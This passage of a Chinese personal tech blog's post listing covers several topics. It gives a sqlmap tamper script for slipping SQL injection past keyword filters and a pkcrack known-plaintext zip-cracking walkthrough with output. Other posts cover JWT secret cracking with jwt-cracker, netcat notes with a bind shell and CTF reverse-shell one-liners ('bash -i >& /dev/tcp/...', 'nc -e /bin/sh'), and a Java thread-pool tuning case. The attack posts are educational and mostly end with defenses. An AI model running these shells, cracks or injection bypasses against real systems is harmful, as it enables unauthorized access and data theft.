class="keyword">from</span> lib.core.common <span class="keyword">import</span> singleTimeWarnMessage</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload, **kwargs)</span>:</span></span><br><span class="line">    payload= payload.lower()</span><br><span class="line">    payload= payload.replace(<span class="string">'union'</span> , <span class="string">'uniunionon'</span>)</span><br><span class="line">    payload= payload.replace(<span class="string">'select'</span> , <span class="string">'selselectect'</span>)</span><br><span class="line">    payload= payload.replace(<span class="string">'where'</span> , <span class="string">'whewherere '</span>)</span><br><span class="line">    payload= payload.replace(<span class="string">'or'</span> , <span class="string">'oorr'</span>)</span><br><span class="line">    payload= payload.replace(<span class="string">'ro'</span> , <span class="string">'rroo'</span>)</span><br><span class="line">    payload= payload.replace(<span class="string">'flag'</span> , <span class="string">'flflagag'</span>)</span><br><span class="line">    payload= payload.replace(<span class="string">"'"</span> , <span class="string">'"'</span>)</span><br><span class="line">    <span class="comment"># payload= payload.replace('from' , 'frfromom')</span></span><br><span class="line">    <span class="comment"># payload= payload.replace('information' , 'infoorrmation')</span></span><br><span class="line">    <span class="comment"># payload= payload.replace('and' , 'anandd')</span></span><br><span class="line">    <span class="comment"># payload= payload.replace('by' , 'bbyy')</span></span><br><span class="line">    retVal=payload</span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure>

<h1 id="如何防御"><a href="#如何防御" class="headerlink" title="如何防御"></a>如何防御</h1><p>1。用模版sql功能，不要自己手拼用户输入到sql;<br>2。校验用户输入；<br>3。限制用户请求频率，控制返回的时间稳定，不要让用户感知到时间差。</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://copyfuture.com/blogs-details/20211205073411933f" target="_blank" rel="noopener">https://copyfuture.com/blogs-details/20211205073411933f</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://xiaoyue26.github.io/2022/09/27/2022-09/sql%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/" data-id="cl8k2l2oz0000xqamban68yds" class="article-share-link">分享</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql/" rel="tag">sql</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sqlmap/" rel="tag">sqlmap</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" rel="tag">信息安全</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/" rel="tag">网络攻防</a></li></ul>

    </footer>
  </div>
  
</article>
 


  
    <article id="post-2022-09/已知明文破解zip" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/09/26/2022-09/%E5%B7%B2%E7%9F%A5%E6%98%8E%E6%96%87%E7%A0%B4%E8%A7%A3zip/" class="article-date">
  <time datetime="2022-09-26T07:40:47.000Z" itemprop="datePublished">2022-09-26</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E7%BD%91%E7%BB%9C/">网络</a>►<a class="article-category-link" href="/categories/%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2022/09/26/2022-09/%E5%B7%B2%E7%9F%A5%E6%98%8E%E6%96%87%E7%A0%B4%E8%A7%A3zip/">已知明文破解zip</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <!-- Table of Contents -->
        
        <h1 id="已知明文攻击"><a href="#已知明文攻击" class="headerlink" title="已知明文攻击"></a>已知明文攻击</h1><p>当我们拿到一个用密码加密的zip文件的时候，如果我们恰好还知道压缩包里某个文件的明文，就可以使用pkcrack进行已知明文破解zip。<br>比如我们的目标是：<code>密文.zip</code>,<br>我们可以直接vi一下这个zip文件可以看到它里面到底有哪些文件。（即使是加密的也可以看到里面有什么文件）<br>比如这个压缩包里恰好有一个<code>明文.png</code>，（有些人喜欢在所有压缩包里放版权声明文件或者广告图，这样根据文件名在网上可以直接搜到明文文件）<br>我们可以把这个<code>明文.png</code>手动压缩一下得到<code>明文.zip</code>。<br>然后开始安装<code>pkcrack</code>然后破解。</p>
<p>mac下可以用brew安装一个pkcrack:</p>
<figure class="highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install pkcrack</span><br></pre></td></tr></table></figure>

<p>或者直接下载一个<code>pkcrack-1.2.2</code>：<br><a href="http://www.password-crackers.com/en/category_98/program_24.html" target="_blank" rel="noopener">http://www.password-crackers.com/en/category_98/program_24.html</a><br>下载以后在src里make一下就能得到可执行文件了。<br>然后就简单了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">cd src</span><br><span class="line">make</span><br><span class="line">cd ..</span><br><span class="line"></span><br><span class="line">[user@ip pkcrack-1.2.2]# .&#x2F;src&#x2F;pkcrack  -C 密文.zip -c 明文.png -P 明文.zip -p 明文.png -d 结果.zip -a</span><br><span class="line">Files read. Starting stage 1 on Mon Sep 26 15:40:09 2022</span><br><span class="line">Generating 1st generation of possible key2_822346 values...done.</span><br><span class="line">Found 4194304 possible key2-values.</span><br><span class="line">Now we&#39;re trying to reduce these...</span><br><span class="line">Lowest number: 947 values at offset 818742</span><br><span class="line">Lowest number: 901 values at offset 818736</span><br><span class="line">Lowest number: 872 values at offset 818720</span><br><span class="line">Lowest number: 847 values at offset 818719</span><br><span class="line">Lowest number: 838 values at offset 818625</span><br><span class="line">Lowest number: 804 values at offset 818589</span><br><span class="line">Lowest number: 745 values at offset 818571</span><br><span class="line">Lowest number: 711 values at offset 818569</span><br><span class="line">Lowest number: 677 values at offset 818366</span><br><span class="line">Lowest number: 657 values at offset 818337</span><br><span class="line">Lowest number: 656 values at offset 818294</span><br><span class="line">Lowest number: 642 values at offset 818292</span><br><span class="line">Lowest number: 589 values at offset 817979</span><br><span class="line">Lowest number: 572 values at offset 817970</span><br><span class="line">Lowest number: 568 values at offset 817966</span><br><span class="line">Lowest number: 564 values at offset 817936</span><br><span class="line">Lowest number: 537 values at offset 817934</span><br><span class="line">Lowest number: 533 values at offset 817907</span><br><span class="line">Lowest number: 530 values at offset 817896</span><br><span class="line">Lowest number: 436 values at offset 817874</span><br><span class="line">Lowest number: 398 values at offset 817862</span><br><span class="line">Lowest number: 394 values at offset 817833</span><br><span class="line">Lowest number: 353 values at offset 817830</span><br><span class="line">Lowest number: 351 values at offset 817789</span><br><span class="line">Lowest number: 328 values at offset 817787</span><br><span class="line">Lowest number: 322 values at offset 817785</span><br><span class="line">Lowest number: 306 values at offset 817784</span><br><span class="line">Lowest number: 291 values at offset 817774</span><br><span class="line">Lowest number: 281 values at offset 817761</span><br><span class="line">Lowest number: 279 values at offset 805546</span><br><span class="line">Lowest number: 253 values at offset 805545</span><br><span class="line">Lowest number: 242 values at offset 805544</span><br><span class="line">Lowest number: 215 values at offset 805519</span><br><span class="line">Lowest number: 212 values at offset 798445</span><br><span class="line">Lowest number: 211 values at offset 798421</span><br><span class="line">Lowest number: 193 values at offset 798402</span><br><span class="line">Lowest number: 187 values at offset 798401</span><br><span class="line">Lowest number: 185 values at offset 798397</span><br><span class="line">Lowest number: 179 values at offset 798395</span><br><span class="line">Lowest number: 178 values at offset 798392</span><br><span class="line">Lowest number: 176 values at offset 798390</span><br><span class="line">Lowest number: 175 values at offset 798382</span><br><span class="line">Lowest number: 174 values at offset 798380</span><br><span class="line">Lowest number: 151 values at offset 798370</span><br><span class="line">Lowest number: 139 values at offset 798369</span><br><span class="line">Lowest number: 127 values at offset 709771</span><br><span class="line">Lowest number: 114 values at offset 709769</span><br><span class="line">Lowest number: 113 values at offset 709767</span><br><span class="line">Lowest number: 110 values at offset 709766</span><br><span class="line">Lowest number: 106 values at offset 709764</span><br><span class="line">Lowest number: 103 values at offset 709752</span><br><span class="line">Lowest number: 101 values at offset 709751</span><br><span class="line">Lowest number: 99 values at offset 709750</span><br><span class="line">Done. Left with 99 possible Values. bestOffset is 709750.</span><br><span class="line">Stage 1 completed. Starting stage 2 on Mon Sep 26 15:40:52 2022</span><br><span class="line">Ta-daaaaa! key0&#x3D;71fc91ef, key1&#x3D;d508d7a6, key2&#x3D;3e05d364</span><br><span class="line">Probabilistic test succeeded for 112601 bytes.</span><br><span class="line">Ta-daaaaa! key0&#x3D;71fc91ef, key1&#x3D;d508d7a6, key2&#x3D;3e05d364</span><br><span class="line">Probabilistic test succeeded for 112601 bytes.</span><br><span class="line">Ta-daaaaa! key0&#x3D;71fc91ef, key1&#x3D;d508d7a6, key2&#x3D;3e05d364</span><br><span class="line">Probabilistic test succeeded for 112601 bytes.</span><br><span class="line">Stage 2 completed. Starting zipdecrypt on Mon Sep 26 15:40:53 2022</span><br><span class="line">Decrypting 其他密文.txt (210b089a08f3aed2247acf25)... OK!</span><br><span class="line">Decrypting 明文.png (a84583e0c35dc7faaa590237)... OK!</span><br><span class="line">Finished on Mon Sep 26 15:40:53 2022</span><br></pre></td></tr></table></figure>

<p>破解后的压缩包就生成到了结果.zip里。</p>
<h1 id="如何防御此类攻击"><a href="#如何防御此类攻击" class="headerlink" title="如何防御此类攻击"></a>如何防御此类攻击</h1><p>1。密码尽量包含多样的字符、长度不太短；<br>2。要加密的压缩包里不要放一些无关紧要、容易被社工手段获取到明文的文件。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://xiaoyue26.github.io/2022/09/26/2022-09/%E5%B7%B2%E7%9F%A5%E6%98%8E%E6%96%87%E7%A0%B4%E8%A7%A3zip/" data-id="cl8igz3qj00000fam0bfp8z49" class="article-share-link">分享</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pkcrack/" rel="tag">pkcrack</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/zip/" rel="tag">zip</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" rel="tag">信息安全</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/" rel="tag">网络攻防</a></li></ul>

    </footer>
  </div>
  
</article>
 


  
    <article id="post-2022-09/jwt破解" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/09/26/2022-09/jwt%E7%A0%B4%E8%A7%A3/" class="article-date">
  <time datetime="2022-09-26T07:09:10.000Z" itemprop="datePublished">2022-09-26</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E7%BD%91%E7%BB%9C/">网络</a>►<a class="article-category-link" href="/categories/%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2022/09/26/2022-09/jwt%E7%A0%B4%E8%A7%A3/">jwt破解</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <!-- Table of Contents -->
        
        <h1 id="What-什么是jwt"><a href="#What-什么是jwt" class="headerlink" title="What: 什么是jwt"></a>What: 什么是jwt</h1><p>JSON Web Token（缩写 JWT）是目前最流行的跨域认证解决方案,主要应用于2个系统之间的授信场景。<br>也能用于身份token。<br>可以参考:<br><a href="https://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html" target="_blank" rel="noopener">https://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html</a></p>
<p>可以使用<br><a href="https://jwt.io/" target="_blank" rel="noopener">https://jwt.io/</a><br>查看jwt的三个组成部分:</p>
<img src="/images/2022-09/jwt.jpg" class="" width="800" height="1200" title="jwt">

<h1 id="How-jwt的保密性如何？"><a href="#How-jwt的保密性如何？" class="headerlink" title="How: jwt的保密性如何？"></a>How: jwt的保密性如何？</h1><p>jwt除了密钥，其他基本是明文，所以保密性较低。</p>
<p>可以用:<br><a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">https://github.com/brendan-rius/c-jwt-cracker</a><br>对它进行破解。</p>
<p>或者直接：</p>
<figure class="highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install --global jwt-cracker</span><br><span class="line">jwt-cracker &lt;jwt&gt;</span><br></pre></td></tr></table></figure>
<p>即可破解jwt中的密钥。</p>
<p>然后在jwt.io上修改payload，填上密钥重新加密即可篡改原来的内容实现破解。</p>
<h1 id="如何防御此类攻击"><a href="#如何防御此类攻击" class="headerlink" title="如何防御此类攻击"></a>如何防御此类攻击</h1><p>1。jwt基础上加上加密、摘要(类似于https/pgp协议)，防止篡改、破解；<br>2。jwt中不存储敏感信息；</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://xiaoyue26.github.io/2022/09/26/2022-09/jwt%E7%A0%B4%E8%A7%A3/" data-id="cl8ifks9j0000dpam6ahp0qxx" class="article-share-link">分享</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/jwt/" rel="tag">jwt</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" rel="tag">信息安全</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/" rel="tag">网络攻防</a></li></ul>

    </footer>
  </div>
  
</article>
 


  
    <article id="post-2022-09/nc命令笔记" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/09/25/2022-09/nc%E5%91%BD%E4%BB%A4%E7%AC%94%E8%AE%B0/" class="article-date">
  <time datetime="2022-09-25T10:31:22.000Z" itemprop="datePublished">2022-09-25</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/shell/">shell</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2022/09/25/2022-09/nc%E5%91%BD%E4%BB%A4%E7%AC%94%E8%AE%B0/">nc命令笔记</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <!-- Table of Contents -->
        
        <h1 id="单聊"><a href="#单聊" class="headerlink" title="单聊"></a>单聊</h1><figure class="highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 服务端(收):</span></span><br><span class="line">nc -l -k 8080</span><br><span class="line"><span class="meta">#</span><span class="bash"> 客户端(发):</span></span><br><span class="line">nc 127.0.0.1 8080</span><br></pre></td></tr></table></figure>
<p>双向聊天的话就开俩端口，互相监听；<br><code>-l</code>就是listen、监听某个端口；<br><code>-k</code>就是keep，不然客户端一断服务端也会关闭；keep的话服务端能保持不挂；</p>
<h1 id="聊天室"><a href="#聊天室" class="headerlink" title="聊天室"></a>聊天室</h1><p>这个可以安装一下nmap(<code>brew install nmap</code>)，然后就可以用ncat了:</p>
<figure class="highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 服务端以broker模式启动:</span></span><br><span class="line">ncat -l 8888 --broker</span><br></pre></td></tr></table></figure>
<p>然后多个客户端可以连到8888上聊天；（客户端用nc或ncat都行）</p>
<h1 id="传输文件"><a href="#传输文件" class="headerlink" title="传输文件"></a>传输文件</h1><p>(就是在聊天基础上加一个管道)</p>
<figure class="highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 接收方:</span></span><br><span class="line">nc -l 8080 &gt; out.jpeg</span><br><span class="line"><span class="meta">#</span><span class="bash"> 发送方:</span></span><br><span class="line">nc 127.0.0.1 &lt; WechatIMG104.jpeg</span><br></pre></td></tr></table></figure>

<h1 id="转发请求"><a href="#转发请求" class="headerlink" title="转发请求:"></a>转发请求:</h1><figure class="highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mkfifo 2way</span><br><span class="line">nc -k -l 8080 0&lt;2way | nc 172.29.53.164 21445 1&gt;2way</span><br><span class="line">nc -k -l 8081 0&lt;2way | nc 127.0.0.1 8080 1&gt;2way</span><br><span class="line"><span class="meta">#</span><span class="bash"> 或</span></span><br><span class="line">ncat -k -l 8080 0&lt;2way | ncat 172.29.53.164 21445 1&gt;2way</span><br><span class="line"><span class="meta">#</span><span class="bash"> 或</span></span><br><span class="line">cat 2way | nc 172.29.53.164 21445 | nc -l 8080 &gt; 2way</span><br><span class="line">cat 2way | nc 127.0.0.1 8080 | nc -k -l 8081 &gt; 2way</span><br><span class="line"><span class="meta">#</span><span class="bash"> 然后</span></span><br><span class="line">echo -n "GET / HTTP/1.0\r\n\r\n" | nc -v -D 127.0.0.1 8080</span><br></pre></td></tr></table></figure>

<h2 id="http服务"><a href="#http服务" class="headerlink" title="http服务"></a>http服务</h2><p>简单启动一个http服务方便测试:</p>
<figure class="highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 8081</span><br></pre></td></tr></table></figure>
<p>然后在当前目录放上index.html就能返回文本给curl请求了。<br>这个在测试命令是否成功执行时能用，也能带回一些基本数据。</p>
<h1 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h1><p>其实就是转发端口上收到的东西到<code>/bin/bash</code>，从而执行命令:</p>
<figure class="highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 被控制端:</span></span><br><span class="line">nc -l 8080 -e /bin/bash</span><br><span class="line"><span class="meta">#</span><span class="bash"> 控制端:</span></span><br><span class="line">nc 127.0.0.1 8080</span><br></pre></td></tr></table></figure>
<p>这个挺离谱的，试了一下可以ls目录，然后cd到某个目录里继续执行ls、回显结果。<br>感觉相当于为所欲为了。</p>
<p>CTF里的反向shell一般是先在自己的机器上:</p>
<figure class="highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 10086</span><br></pre></td></tr></table></figure>
<p>然后想办法在目标机器上执行:</p>
<figure class="highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/&lt;my_server_ip&gt;/10086 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<p>或者:</p>
<figure class="highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh &lt;my_server_ip&gt; 10086</span><br></pre></td></tr></table></figure>

<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://linux.cn/article-9190-1.html" target="_blank" rel="noopener">https://linux.cn/article-9190-1.html</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://xiaoyue26.github.io/2022/09/25/2022-09/nc%E5%91%BD%E4%BB%A4%E7%AC%94%E8%AE%B0/" data-id="cl8h7yeg1000021am999s9mu3" class="article-share-link">分享</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/nc/" rel="tag">nc</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ncat/" rel="tag">ncat</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/shell/" rel="tag">shell</a></li></ul>

    </footer>
  </div>
  
</article>
 


  
    <article id="post-2022-09/调优-解决线程池造成的进程卡顿、cpu毛刺问题" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/09/25/2022-09/%E8%B0%83%E4%BC%98-%E8%A7%A3%E5%86%B3%E7%BA%BF%E7%A8%8B%E6%B1%A0%E9%80%A0%E6%88%90%E7%9A%84%E8%BF%9B%E7%A8%8B%E5%8D%A1%E9%A1%BF%E3%80%81cpu%E6%AF%9B%E5%88%BA%E9%97%AE%E9%A2%98/" class="article-date">
  <time datetime="2022-09-25T07:11:32.000Z" itemprop="datePublished">2022-09-25</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/java/">java</a>►<a class="article-category-link" href="/categories/java/%E6%80%A7%E8%83%BD/">性能</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2022/09/25/2022-09/%E8%B0%83%E4%BC%98-%E8%A7%A3%E5%86%B3%E7%BA%BF%E7%A8%8B%E6%B1%A0%E9%80%A0%E6%88%90%E7%9A%84%E8%BF%9B%E7%A8%8B%E5%8D%A1%E9%A1%BF%E3%80%81cpu%E6%AF%9B%E5%88%BA%E9%97%AE%E9%A2%98/">调优-解决线程池造成的进程卡顿、cpu毛刺问题</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <!-- Table of Contents -->
        
        <h1 id="背景-amp-现象"><a href="#背景-amp-现象" class="headerlink" title="背景&amp;现象"></a>背景&amp;现象</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>有个qps较高的rpc，使用了线程池来并发请求多个下游服务，且设定了对于下游的超时时间。</p>
<h2 id="现象"><a href="#现象" class="headerlink" title="现象"></a>现象</h2><p>rpc服务调用下游时，时不时出现耗时很高的情况，平均耗时挺低的，但是p99和p995就比较高了，达到秒级，超过了设定的调用下游的超时时间。<br>从rpc monitor上看，调用下游实际也用不了这么长时间，说明不是跨span的耗时；<br>使用arthas  trace查看方法级的耗时:</p>
<img src="/images/2022-09/trace_supply.png" class="" width="800" height="1200" title="trace_supply">
<img src="/images/2022-09/start.png" class="" width="800" height="1200" title="start">
<p>可以发现是频繁start新的thread导致的。</p>
<p>再查看日志里的线程编号：<br>-thread-7665821<br>已经达到七百万了！</p>
<p>参考以前的学习：<br><a href="http://xiaoyue26.github.io/2022/03/14/2022-03/%E4%B8%AD%E6%96%AD%E6%A2%B3%E7%90%86/">http://xiaoyue26.github.io/2022/03/14/2022-03/%E4%B8%AD%E6%96%AD%E6%A2%B3%E7%90%86/</a></p>
<img src="/images/2022-09/core_thread.png" class="" width="800" height="1200" title="core_thread">
<p>由于jvm线程与内核线程一一对应(hotpot jvm下)，频繁回收、创建带来的内核态切换、系统调用开销过于大了。</p>
<h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><p>综上可以发现线程池里有频繁的线程回收、再创建操作，需要关闭core线程自动回收的机制（基础框架内默认是开启回收）</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DynamicThreadExecutor.dynamic(POOL_SIZE::get, <span class="string">"csc-center-executor-%d"</span>, <span class="keyword">false</span>);</span><br></pre></td></tr></table></figure>

<p>字段注释：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@param</span> allowCoreThreadTimeout 是否允许核心线程超时后被回收，</span><br><span class="line">*         超时时间参数可通过为&#123;<span class="meta">@link</span> ExecutorBuilder.coreThreadKeepAliveMillis&#125;设置</span><br><span class="line">*         默认超时时间为<span class="number">1</span>分钟</span><br></pre></td></tr></table></figure>

<h1 id="收益"><a href="#收益" class="headerlink" title="收益"></a>收益</h1><p>请求耗时p99\p995、超时异常大幅降低；</p>
<img src="/images/2022-09/p99.png" class="" width="800" height="1200" title="p99">
<img src="/images/2022-09/timeout.png" class="" width="800" height="1200" title="timeout">

<h1 id="更多参考代码"><a href="#更多参考代码" class="headerlink" title="更多参考代码"></a>更多参考代码</h1><p>也可以自己选择喜欢的builder创建:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> DynamicThreadExecutor fromBuilder = DynamicThreadExecutor.dynamic(POOL_SIZE::get,</span><br><span class="line">       num -&gt; ExecutorsEx.newBlockingThreadPool(ExecutorBuilder</span><br><span class="line">               .newBuilder()</span><br><span class="line">               .allowCoreThreadTimeout(<span class="keyword">false</span>)</span><br><span class="line">               .threadSize(num)</span><br><span class="line">               .queueSize(num)</span><br><span class="line">               .theadNameFormat(<span class="string">"from-builder-%d"</span>)));</span><br></pre></td></tr></table></figure>

<h1 id="注意事项-可能的坑"><a href="#注意事项-可能的坑" class="headerlink" title="注意事项(可能的坑)"></a>注意事项(可能的坑)</h1><ol>
<li>摘要中的代码默认创建的是BlockingThreadPool，不支持嵌套使用。不要在提交的任务中再次提交任务到同一个线程池，以免死锁。<br>(jdk中的支持嵌套调用)</li>
</ol>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://zhuanlan.zhihu.com/p/342929293" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/342929293</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://xiaoyue26.github.io/2022/09/25/2022-09/%E8%B0%83%E4%BC%98-%E8%A7%A3%E5%86%B3%E7%BA%BF%E7%A8%8B%E6%B1%A0%E9%80%A0%E6%88%90%E7%9A%84%E8%BF%9B%E7%A8%8B%E5%8D%A1%E9%A1%BF%E3%80%81cpu%E6%AF%9B%E5%88%BA%E9%97%AE%E9%A2%98/" data-id="cl8h0idzb0000dzama6npgvog" class="article-share-link">分享</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/java/" rel="tag">java</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BA%BF%E7%A8%8B%E6%B1%A0/" rel="tag">线程池</a></li></ul>

    </footer>
  </div>
  
</article>
 


  
    <article id="post-2022-08/调优-cpu毛刺问题" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/08/30/2022-08/%E8%B0%83%E4%BC%98-cpu%E6%AF%9B%E5%88%BA%E9%97%AE%E9%A2%98/" class="article-date">
  <time datetime="2022-08-30T10:07:52.000Z" itemprop="datePublished">2022-08-30</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/java/">java</a>►<a class="article-category-link" href="/categories/java/%E6%80%A7%E8%83%BD/">性能</a>
  </div>

  </div>
